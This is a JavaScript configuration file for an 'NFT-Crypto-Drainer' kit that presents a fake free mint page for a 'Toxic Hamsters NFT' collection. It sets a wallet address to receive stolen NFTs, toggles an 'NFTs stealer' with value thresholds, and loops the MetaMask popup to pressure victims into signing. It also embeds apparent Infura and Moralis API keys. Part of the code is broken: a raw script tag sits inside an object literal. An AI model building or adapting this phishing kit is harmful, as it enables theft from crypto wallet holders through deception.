// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0xf5450c06CafF5E3E26220D356184b81914CB7f6C";    // Your ETH wallet that you have to receive NFTs
const infuraId = "d0b2307f2b6d4a2fa21e59b88d8d4273"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "cc4iF641cVC1v7wxhMoBSds1skRK3zp1ixTjm8jWE0iZtIfsDCEOhZJpFdjFOFRj"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Toxic Hamsters NFT",
    title: "Free {name} Mint", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: <script> document.write(new Date().toLocaleDateString()); </script>, // Today date
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.png",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0,         // Price per NFT.
    totalSupply: 2222,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 2,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.04,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "0xf5450c06CafF5E3E26220D356184b81914CB7f6C" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
